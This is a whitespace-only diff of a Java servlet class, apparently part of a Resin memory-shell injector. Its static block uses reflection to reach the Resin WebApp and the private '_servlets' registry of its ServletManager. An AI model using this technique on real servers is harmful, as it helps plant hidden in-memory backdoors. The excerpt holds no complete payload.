@@ -15,12 +15,12 @@ public class RSMSFromThreadS implements Servlet {
 
     static {
         try {
-            Class                        si                = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
-            Method                       getContextRequest = si.getMethod("getContextRequest");
-            javax.servlet.ServletRequest contextRequest    = (javax.servlet.ServletRequest) getContextRequest.invoke(null);
+            Class si = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
+            Method getContextRequest = si.getMethod("getContextRequest");
+            javax.servlet.ServletRequest contextRequest = (javax.servlet.ServletRequest) getContextRequest.invoke(null);
 
             Method getServletContext = javax.servlet.ServletRequest.class.getMethod("getServletContext");
-            Object web               = getServletContext.invoke(contextRequest);
+            Object web = getServletContext.invoke(contextRequest);
 
             com.caucho.server.webapp.WebApp web1 = (com.caucho.server.webapp.WebApp) web;
 
@@ -38,7 +38,7 @@ public class RSMSFromThreadS implements Servlet {
             f2.setAccessible(true);
 
             Object manager = f2.get(web1);
-            Field  f3      = ServletManager.class.getDeclaredField("_servlets");
+            Field f3 = ServletManager.class.getDeclaredField("_servlets");
             f3.setAccessible(true);
             HashMap map = (HashMap) f3.get(manager);
 
